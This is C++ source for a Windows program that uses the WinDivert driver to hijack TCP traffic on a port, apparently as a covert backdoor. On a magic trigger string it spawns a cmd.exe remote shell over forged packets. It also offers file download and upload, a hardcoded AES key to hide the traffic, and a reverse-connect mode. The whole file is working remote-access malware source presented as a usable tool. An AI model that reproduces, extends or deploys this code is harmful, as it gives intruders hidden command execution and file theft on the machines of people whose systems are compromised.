#include "server.h"
#include "windivert_bin.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib,"WinDivert.lib")

static uint8 key[16] = {
	0x0f,0x15,0x71,0xc9,
	0x47,0xd9,0xe8,0x59,
	0x0c,0xb7,0xad,0xd6,
	0xaf,0x7f,0x67,0x98
};

int main(int argc, char** argv)
{
	CServer port_reuse;
	if (argc == 1)
	{
		port_reuse.show_help();
		return 0;
	}
	for (int i = 1; i < argc; ++i)
	{
		if (!_stricmp(argv[i], "-raddr") )
		{
			if (!port_reuse.set_raddr(argv[i + 1])) {
				cout << "[!] address invalid" << endl;
				return 0;
			}
		}		
		if (!_stricmp(argv[i], "-laddr"))
		{
			if (!port_reuse.set_laddr(argv[i + 1])) {
				cout << "[!] address invalid" << endl;
				return 0;
			}
		}
		else if (!_stricmp(argv[i], "-lport"))
		{
			port_reuse.set_lport(atoi(argv[i + 1]));
		}
		else if (!_stricmp(argv[i], "-rport"))
		{
			port_reuse.set_rport(atoi(argv[i + 1]));
		}
		else if (!_stricmp(argv[i], "-e"))
		{
			port_reuse.set_use_encrypt(true);
		}
		else if (!_stricmp(argv[i], "-h"))
		{
			port_reuse.show_help();
			return 0;
		}
	}
	port_reuse.start();
	return 0;
}

CServer::CServer()
{
	m_divert_handle = NULL;
	m_template_packet_len = 0;
	m_packet_template = NULL;
	m_addr_template = NULL; 
	aes_set_key(&m_aes_ctx, key, 128);
	m_use_crypt = false;
	m_reverse_mode = false;
	m_lport = 54321;
	m_rport = 8888;
}

CServer::~CServer()
{
	WinDivertShutdown(m_divert_handle, WINDIVERT_SHUTDOWN_BOTH);
}

void CServer::set_reverse_mode(bool mode)
{
	m_reverse_mode = mode;
}

void CServer::start()
{
	release_sysfile();
	if (!init_divert("tcp.SrcPort = 8888"))	{
		return;
	}
	if (m_reverse_mode == true)	{
		connect_to_target();
	}
	else {
		wait_for_connect();
	}

	UINT payload_len;
	PVOID payload_buf;

	char packet[WINDIVERT_MTU_MAX] = {};

	while (TRUE)
	{
		if (!recv_data_packet(packet, &payload_len, &payload_buf))
			continue;

		if (payload_len && payload_buf)
		{
			if (payload_len >= strlen(SHELL_START) && !memcmp(payload_buf, SHELL_START, strlen(SHELL_START)))
			{
				run_shell();
			}
		}
	}
}

void CServer::send_response_packet(PVOID packet, UINT recv_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT payload_len;
	WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		&payload_len, NULL, NULL);

	swap(tcp_header->DstPort, tcp_header->SrcPort);
	swap(ip_header->DstAddr, ip_header->SrcAddr);
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) - payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);
	tcp_header->Ack = 1;
	UINT32 original_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + payload_len;
	tcp_header->SeqNum = tcp_header->AckNum;
	tcp_header->AckNum = WinDivertHelperHtonl(original_seq);
	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
	UINT send_len = 0;
	if (!WinDivertSend(m_divert_handle, packet, recv_len, &send_len, m_addr_template.get()))
	{
		cout << "[!] failed to send connect reponse packet (" << GetLastError() << ")!" << endl;
	}
	cout << "[*] send connect reponse packet " << send_len << " bytes successfully!" << endl;
}

void CServer::set_packet_template(PVOID packet, UINT recv_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT payload_len;

	WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		&payload_len, NULL, NULL);
	m_template_packet_len = recv_len - payload_len;
	m_packet_template = shared_ptr<char[]>(new char[m_template_packet_len] {});
	if (m_packet_template == NULL) {
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memcpy(m_packet_template.get(), packet, m_template_packet_len);
	WinDivertHelperParsePacket(m_packet_template.get(), recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	swap(tcp_header->DstPort, tcp_header->SrcPort);
	swap(ip_header->DstAddr, ip_header->SrcAddr);
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) - payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);
	tcp_header->Psh = 0;
	tcp_header->Ack = 0;
	tcp_header->Syn = 0;
	UINT32 original_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + payload_len;
	tcp_header->SeqNum = tcp_header->AckNum;
	tcp_header->AckNum = WinDivertHelperHtonl(original_seq);

	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
}

void CServer::set_addr_template(WINDIVERT_ADDRESS addr)
{
	m_addr_template = make_shared<WINDIVERT_ADDRESS>();
	if (m_addr_template == NULL) {
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memcpy(m_addr_template.get(), &addr, sizeof(WINDIVERT_ADDRESS));
	m_addr_template->Outbound = 1;
}

void CServer::send_data_packet(const char* payload_buf, int payload_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT send_payload_len;
	PVOID send_payload_buf;
	UINT packet_len, send_len;

	if (!payload_len)
		payload_len = strlen(payload_buf);
	send_payload_len = 16 * (payload_len / 16 + 1);
	auto encrypt_buf = shared_ptr<char[]>(new char[send_payload_len]());
	if (!encrypt_buf) {
		return;
	}
	memcpy(encrypt_buf.get(), payload_buf, payload_len);
	encrypt_payload(encrypt_buf.get(), send_payload_len);

	packet_len = m_template_packet_len + send_payload_len;
	// build response packet
	auto reponse_packet = unique_ptr<char[]>(new char[packet_len]());
	if (!reponse_packet) {
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memcpy(reponse_packet.get(), m_packet_template.get(), m_template_packet_len);

	WinDivertHelperParsePacket(reponse_packet.get(), packet_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	// rebuild ip header
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) + send_payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);

	tcp_header->Psh = 1;
	tcp_header->Ack = 1;
	// pack new payload in
	// cause template packet has no payload buf, we pos it manully. 
	send_payload_buf = (PVOID)((ULONG_PTR)tcp_header + sizeof(WINDIVERT_TCPHDR));
	memcpy(send_payload_buf, encrypt_buf.get(), send_payload_len);
	WinDivertHelperCalcChecksums(reponse_packet.get(), packet_len, m_addr_template.get(), 0);

	if (!WinDivertSend(m_divert_handle, reponse_packet.get(), packet_len, &send_len, m_addr_template.get()) || send_len == 0) {
		cout << "[!] failed to send data packet (" << GetLastError() << ")!" << endl;
	}
	else {
		cout << "[*] send data packet " << send_len << " bytes successfully!" << endl;
	}
	add_seq(send_payload_len);
}

BOOL CServer::init_divert(const char* filter)
{
	int priority = 0;
	cout << "[*] filter = \"" << filter << "\"" << endl;
	m_divert_handle = WinDivertOpen(filter, WINDIVERT_LAYER_NETWORK, (INT16)priority, 0);
	if (m_divert_handle == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == ERROR_INVALID_PARAMETER)
		{
			cout << "[!] filter syntax error!" << endl;
			return FALSE;
		}
		cout << "[!] failed to open the WinDivert device (" << GetLastError() << ")!" << endl;
		return FALSE;
	}

	cout << "[*] divert open successfully." << endl;
	return TRUE;
}

void CServer::run_shell()
{
	init_shell();
	UINT payload_len;
	char* payload_buf;

	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());

	while (true)
	{
		if (!recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf))
			continue;
		if (payload_len && payload_buf)
		{
			if (strstr(payload_buf, "download"))
			{
				download_file(payload_buf);
				continue;
			}			
			if (strstr(payload_buf, "upload"))
			{
				upload_file(payload_buf);
				continue;
			}
			DWORD real_write = 0;
			strcpy(last_cmd, payload_buf);
			if (!WriteFile(m_std_in_wr, payload_buf, strlen(payload_buf), &real_write, NULL))
			{
				cout << "[!] write data:"<< payload_buf << " error!" << endl;
			}
		}
	}
}

void CServer::init_shell()
{
	cout << "[*] start shell mode" << endl;

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	CreatePipe(&m_std_out_rd, &m_std_out_wr, &sa, 0);
	SetHandleInformation(m_std_out_rd, HANDLE_FLAG_INHERIT, 0);
	CreatePipe(&m_std_in_rd, &m_std_in_wr, &sa, 0);
	SetHandleInformation(m_std_in_wr, HANDLE_FLAG_INHERIT, 0);

	STARTUPINFO start_info;
	TCHAR cmd_line[] = TEXT("cmd");
	ZeroMemory(&start_info, sizeof(STARTUPINFO));
	start_info.cb = sizeof(STARTUPINFO);
	start_info.hStdError = m_std_out_wr;
	start_info.hStdOutput = m_std_out_wr;
	start_info.hStdInput = m_std_in_rd;
	start_info.dwFlags |= STARTF_USESTDHANDLES;
	CreateProcess(NULL,
		cmd_line,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&start_info,
		&m_proc_info);
	m_read_thread = (HANDLE)_beginthreadex(nullptr, 0, read_from_cmd, this, 0, &m_thread_id);
}

void CServer::exit_shell()
{
	TerminateProcess(m_proc_info.hProcess, 0);
	TerminateThread(m_read_thread, 0);
	CloseHandle(m_read_thread);
	CloseHandle(m_proc_info.hProcess);
	CloseHandle(m_proc_info.hThread);
	CloseHandle(m_std_in_rd);
	CloseHandle(m_std_in_wr);
	CloseHandle(m_std_out_rd);
	CloseHandle(m_std_out_wr);
	cout << "[*] exit shell mode" << endl;
}

void CServer::add_seq(UINT seq)
{
	PWINDIVERT_TCPHDR tcp_header;

	WinDivertHelperParsePacket(m_packet_template.get(), m_template_packet_len, NULL, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	UINT32 add_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + seq;
	tcp_header->SeqNum = WinDivertHelperHtonl(add_seq);
}

void CServer::send_connect_reponse(PVOID packet, UINT recv_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL , NULL, NULL);

	swap(tcp_header->DstPort, tcp_header->SrcPort);
	swap(ip_header->DstAddr, ip_header->SrcAddr);
	tcp_header->Ack = 1;
	tcp_header->Syn = 1;
	tcp_header->AckNum = WinDivertHelperHtonl(WinDivertHelperNtohl(tcp_header->SeqNum) + 1);
	tcp_header->SeqNum = WinDivertHelperHtonl(100000);
	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
	UINT send_len = 0;
	if (!WinDivertSend(m_divert_handle, packet, recv_len, &send_len, m_addr_template.get()))
	{
		cout << "[!] failed to send reponse packet (" << GetLastError() << ")!" << endl;
	}
	cout << "[*] send reponse packet " << send_len << " bytes successfully!" << endl;
}

unsigned __stdcall CServer::read_from_cmd(void* ptr)
{
	CServer* pthis = (CServer*)ptr;
	uint8_t buff[FILE_SIZE];
	DWORD read_size;
	while (true)
	{
		if (!ReadFile(pthis->m_std_out_rd, buff, FILE_SIZE - 1, &read_size, nullptr) || !read_size)
		{
			break;
		}
		buff[read_size] = 0;

		if (strlen((char*)buff) == strlen(pthis->last_cmd) && !strcmp((char*)buff, pthis->last_cmd))
		{
			continue;
		}
		pthis->send_data_packet((const char*)buff);
	}

	_endthreadex(0);
	return 0;
}

void CServer::encrypt_payload(PVOID buf_data, UINT buf_len)
{
	if (!m_use_crypt)
		return;
	for (int i = 0; i != buf_len; i += 16)
	{
		aes_encrypt(&m_aes_ctx, (unsigned char*)buf_data + i);
	}
}

void CServer::decrypt_payload(PVOID buf_data, UINT buf_len)
{
	if (!m_use_crypt)
		return;
	for (int i = 0; i != buf_len; i += 16)
	{
		aes_decrypt(&m_aes_ctx, (unsigned char*)buf_data + i);
	}
}

void CServer::print_ip_info(PWINDIVERT_IPHDR ip_header)
{
	char dst_addr[16];
	char src_addr[16];
	if (WinDivertHelperFormatIPv4Address(ip_header->DstAddr, dst_addr, 16) &&
		WinDivertHelperFormatIPv4Address(ip_header->SrcAddr, src_addr, 16))
	{
		cout << "[*] dst addr:" << dst_addr << "; src addr:" << src_addr << endl;
	}
}

bool CServer::recv_data_packet(PVOID packet_buf, PUINT payload_len, PVOID *payload_buf)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT recv_len;
	if (!WinDivertRecv(m_divert_handle, packet_buf, WINDIVERT_MTU_MAX, &recv_len, NULL))
	{
		cout << "[!] failed to read packet (" << GetLastError() << ")!" << endl;
		return false;
	}
	if (!m_template_packet_len)
	{
		set_packet_template(packet_buf, recv_len);
	}
	WinDivertHelperParsePacket(packet_buf, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, payload_buf,
		payload_len, NULL, NULL);
	if (ip_header)
	{
		print_ip_info(ip_header);
	}
	if (tcp_header)
	{
		cout << "[*] dst port:" << WinDivertHelperNtohs(tcp_header->DstPort) << "; src port:" << WinDivertHelperNtohs(tcp_header->SrcPort) << endl;
	}
	if (*payload_buf && *payload_len)
	{
		send_response_packet(packet_buf, recv_len);
		decrypt_payload(*payload_buf, *payload_len);
		cout << "[*] recv payload length: " << *payload_len << " bytes" << endl;
		return true;
	}
	else
	{
		return false;
	}
}

void CServer::wait_for_connect()
{
	UINT recv_len;
	WINDIVERT_ADDRESS addr;
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;

	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());
	cout << "[*] waiting for connect..." << endl;

	while (TRUE)
	{
		if (!WinDivertRecv(m_divert_handle, packet.get(), WINDIVERT_MTU_MAX, &recv_len, &addr))
		{
			continue;
		}

		WinDivertHelperParsePacket(packet.get(), recv_len, &ip_header, NULL,
			NULL, NULL, NULL, &tcp_header, NULL, NULL,
			NULL, NULL, NULL);
		if (ip_header)
		{
			print_ip_info(ip_header);
		}
		if (tcp_header)
		{
			cout << "[*] dst port:" << WinDivertHelperNtohs(tcp_header->DstPort) << "; src port:" << WinDivertHelperNtohs(tcp_header->SrcPort) << endl;
			if (tcp_header->Syn)
			{
				cout << "[*] syn packet recv!" << endl;
				set_addr_template(addr);
				send_connect_reponse(packet.get(), recv_len);
				break;
			}
		}
	}
}

void CServer::download_file(string download_str)
{
	string word,src_file, dst_file;
	if (download_str.empty())
	{
		return;
	}

	stringstream str_stream(download_str);
	str_stream >> word;
	str_stream >> src_file;
	str_stream >> dst_file;

	cout << "[*] download file " << src_file << " to " << dst_file << endl;
	FILE* fp = fopen(src_file.c_str(), "rb");
	if (!fp)
	{
		cout << "[!] failed to open file " << src_file << "  (" << GetLastError() << ")!" << endl;
		send_data_packet("file_no_exist");
		return;
	}
	send_data_packet("download_start");
	size_t want_read = FILE_SIZE - sizeof(size_t) - 16;
	auto file_buf = shared_ptr<char[]>(new char[want_read] {});
	while (true)
	{
		size_t real_read = fread(file_buf.get() + 4, 1, want_read, fp);
		if (real_read < 0)
		{
			cout << "[!] failed to read file " << src_file << " (" << GetLastError() << ")!" << endl;
			return;
		}
		*(size_t*)file_buf.get() = real_read;
		
		send_data_packet(file_buf.get(), real_read + 4);
		cout << "[*] send file data " << real_read << " bytes finish" << endl;
		if (want_read > real_read)
		{
			cout << "[*] download file " << src_file << " to " << dst_file << " finish" << endl;
			send_data_packet("download_finish");
			return;
		}
	}
}

void CServer::upload_file(string upload_str)
{
	string word, src_file, dst_file;
	UINT payload_len;
	char* payload_buf;
	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());
	if (upload_str.empty())
	{
		return;
	}

	stringstream str_stream(upload_str);
	str_stream >> word;
	str_stream >> src_file;
	str_stream >> dst_file;

	cout << "[*] upload file" << src_file << "to" << dst_file << endl;
	ofstream fout = ofstream(dst_file, ios::binary);
	if (!fout.is_open())
	{
		cout << "[!] failed to open file buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	send_data_packet("upload_start");
	int i = 0;
	while (true)
	{
		i++;
		if (!recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf))
			continue;
		if (payload_len== 16 && !strcmp(payload_buf, "upload_finish"))
		{
			cout << "[*] finish upload" << endl;
			fout.close();
			return;
		}

		size_t len = *(size_t*)payload_buf;
		cout << "[*] recv file data " << len << " bytes" << endl;
		fout.write(payload_buf + 4, len);
		send_data_packet("recv_ok");
	}
}

bool CServer::release_sysfile()
{
#ifdef _WIN64
	ofstream fout = ofstream("WinDivert64.sys", ios::binary);
	fout.write((const char*)SYS_DATA_X64, sizeof(SYS_DATA_X64));
#else
	ofstream fout = ofstream("WinDivert32.sys", ios::binary);
	fout.write((const char*)SYS_DATA_X86, sizeof(SYS_DATA_X86));
#endif 
	fout.close();
	return true;
}

bool CServer::connect_to_target()
{
	build_packet_template();
	build_addr_template();

	// 1.send SYN apcket (handshake 1)
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	int packet_len = m_template_packet_len + 12;		// options 12 bytes
	auto syn_packet = unique_ptr<char[]>(new char[packet_len]());
	if (!syn_packet)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return false;
	}
	memcpy(syn_packet.get(), m_packet_template.get(), m_template_packet_len);
	WinDivertHelperParsePacket(syn_packet.get(), m_template_packet_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);
	tcp_header->HdrLength = 8;
	tcp_header->Syn = 1;
	ip_header->Length = WinDivertHelperHtons(52);
	char options[12] = { 0x02,0x04,0x05,0xb4,0x01,0x03,0x03,0x08,0x01,0x01,0x04,0x02 };
	memcpy(syn_packet.get() + m_template_packet_len, options, 12);
	WinDivertHelperCalcChecksums(syn_packet.get(), packet_len, NULL, 0);
	UINT send_len = 0;
	if (!WinDivertSend(m_divert_handle, syn_packet.get(), packet_len, &send_len, m_addr_template.get()))
	{
		cout << "[!] failed to send SYN packet (" << GetLastError() << ")!" << endl;
		return false;
	}
	cout << "[*] send SYN packet " << send_len << " bytes successfully!" << endl;

	// 2.recv SYN-AKC packet (handshake 2)
	UINT recv_len = 0;
	UINT32 seq_num = 0;
	UINT32 ack_num = 0;
	auto syn_ack_packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());
	cout << "[*] waiting for SYN-AKC packet..." << endl;

	while (TRUE)
	{
		if (!WinDivertRecv(m_divert_handle, syn_ack_packet.get(), WINDIVERT_MTU_MAX, &recv_len, NULL))
		{
			continue;
		}

		WinDivertHelperParsePacket(syn_ack_packet.get(), recv_len, &ip_header, NULL,
			NULL, NULL, NULL, &tcp_header, NULL, NULL,
			NULL, NULL, NULL);
		if (ip_header)
		{
			print_ip_info(ip_header);
		}
		if (tcp_header)
		{
			cout << "[*] dst port:" << WinDivertHelperNtohs(tcp_header->DstPort) << "; src port:" << WinDivertHelperNtohs(tcp_header->SrcPort) << endl;
			if (tcp_header->Syn)
			{
				cout << "[*] SYN-ACK packet recv!" << endl;
				seq_num = tcp_header->SeqNum;
				ack_num = tcp_header->AckNum;
				break;
			}
		}
	}

	// 3.send ACK packet (handshake 3)

	auto ack_packet = shared_ptr<char[]>(new char[m_template_packet_len]());
	if (!ack_packet)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return false;
	}
	memcpy(ack_packet.get(), m_packet_template.get(), m_template_packet_len);
	WinDivertHelperParsePacket(ack_packet.get(), m_template_packet_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	tcp_header->AckNum = WinDivertHelperHtonl(WinDivertHelperNtohl(seq_num) + 1);
	tcp_header->SeqNum = ack_num;
	tcp_header->Ack = 1;
	tcp_header->Window = 0x0402;
	WinDivertHelperCalcChecksums(ack_packet.get(), m_template_packet_len, NULL, 0);
	send_len = 0;
	if (!WinDivertSend(m_divert_handle, ack_packet.get(), m_template_packet_len, &send_len, m_addr_template.get()))
	{
		cout << "[!] failed to send ACK packet (" << GetLastError() << ")!" << endl; 
		return false;
	}
	cout << "[*] send ACK packet " << send_len << " bytes successfully!" << endl;

	// reset template
	m_packet_template.reset();
	m_packet_template = NULL;
	m_template_packet_len = 0;
	return true;
}

void CServer::build_packet_template()
{
	m_template_packet_len = sizeof(WINDIVERT_IPHDR) + sizeof(WINDIVERT_TCPHDR);
	m_packet_template = shared_ptr<char[]>(new char[m_template_packet_len] {});
	if (m_packet_template == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}

/*
typedef struct
{
    UINT8  HdrLength:4;
    UINT8  Version:4;
    UINT8  TOS;
    UINT16 Length;
    UINT16 Id;
    UINT16 FragOff0;
    UINT8  TTL;
    UINT8  Protocol;
    UINT16 Checksum;
    UINT32 SrcAddr;
    UINT32 DstAddr;
} WINDIVERT_IPHDR, *PWINDIVERT_IPHDR;
*/
	WINDIVERT_IPHDR iphdr{ 0 };
	iphdr.Version = 4;			// 0100(IPv4)
	iphdr.HdrLength = 5;		// ip header length = 5 * 4 (byte)
	iphdr.TOS = 0;				// Type of Service: 000 (Routine)
	iphdr.Length = WinDivertHelperHtons(40);			// todo
	iphdr.Id = WinDivertHelperHtons(0xf52e);			// ?
	iphdr.FragOff0 = 0x40;	// Flags:0x40, Don't fragment;Fragment Offet: 0
	iphdr.TTL = 128;			// Time To Live
	iphdr.Protocol = 6;			// TCP (6)
	iphdr.Checksum = 0;			// todo
	// iphdr.SrcAddr = m_laddr;
	iphdr.SrcAddr = INADDR_ANY;
	iphdr.DstAddr = m_raddr;

/*
typedef struct
{
    UINT16 SrcPort;
    UINT16 DstPort;
    UINT32 SeqNum;
    UINT32 AckNum;
    UINT16 Reserved1:4;
    UINT16 HdrLength:4;
    UINT16 Fin:1;
    UINT16 Syn:1;
    UINT16 Rst:1;
    UINT16 Psh:1;
    UINT16 Ack:1;
    UINT16 Urg:1;
    UINT16 Reserved2:2;
    UINT16 Window;
    UINT16 Checksum;
    UINT16 UrgPtr;
} WINDIVERT_TCPHDR, *PWINDIVERT_TCPHDR;
*/
	WINDIVERT_TCPHDR tcphdr{ 0 };
	tcphdr.SrcPort = WinDivertHelperHtons(m_lport);
	tcphdr.DstPort = WinDivertHelperHtons(m_rport);
	tcphdr.SeqNum = rand();		// random seq number ISN(Initial Sequence Number)
	tcphdr.AckNum = 0;				// ?
	tcphdr.Reserved1 = 0;
	tcphdr.HdrLength = 5;			// tcp header length = 5 * 4 (byte)
	tcphdr.Window = WinDivertHelperHtons(64240);
	tcphdr.Checksum = 0;	// todo
	tcphdr.UrgPtr = 0;

	memcpy(m_packet_template.get(), &iphdr, sizeof(WINDIVERT_IPHDR));
	memcpy(m_packet_template.get() + sizeof(WINDIVERT_IPHDR), &tcphdr, sizeof(WINDIVERT_TCPHDR));
	WinDivertHelperCalcChecksums(m_packet_template.get(), m_template_packet_len, NULL, 0);
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	WinDivertHelperParsePacket(m_packet_template.get(), m_template_packet_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);
}

void CServer::build_addr_template()
{
	m_addr_template = make_shared<WINDIVERT_ADDRESS>();
	if (m_addr_template == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memset(m_addr_template.get(), 0, sizeof(WINDIVERT_ADDRESS));
	m_addr_template->TCPChecksum = 1;
	m_addr_template->UDPChecksum = 1;
	m_addr_template->IPChecksum = 1;
	m_addr_template->Outbound = 1;
	m_addr_template->Network.IfIdx = 4;
	LARGE_INTEGER ticks;
	QueryPerformanceCounter(&ticks);
	m_addr_template->Timestamp = ticks.QuadPart;
}

void CServer::show_help()
{
	cout << endl << "Usage: server [-raddr address][-laddr address]" << endl << 
		"\t    [-lport port][-rport port][-r][-e]" << endl << endl;

	cout << "Options:" << endl;
	cout << "\t-raddr address	connect to host Remote host address.(only need in reverse mode)" << endl;
	cout << "\t-laddr address	connect to host Remote host address.(only need in reverse mode)" << endl;
	cout << "\t-lport port		the port on local side.(default 8888)" << endl;
	cout << "\t-rport port		the port on remote host.(default 54321)" << endl;
	cout << "\t-reverse			use reverse mode.(default direct mode)" << endl;
	cout << "\t-e				use AES encrypt." << endl;
	cout << "\t-h				show this help info" << endl;
}

void CServer::set_use_encrypt(bool mode)
{
	m_use_crypt = mode;
}

void CServer::set_lport(UINT16 lport)
{
	m_lport = lport;
}

void CServer::set_rport(UINT16 rport)
{
	m_rport = rport;
}

bool CServer::set_laddr(std::string laddr)
{
	m_laddr = inet_addr(laddr.c_str());
	return INADDR_NONE != m_laddr;
}

bool CServer::set_raddr(std::string raddr)
{
	m_raddr = inet_addr(raddr.c_str());
	return INADDR_NONE != m_raddr;
}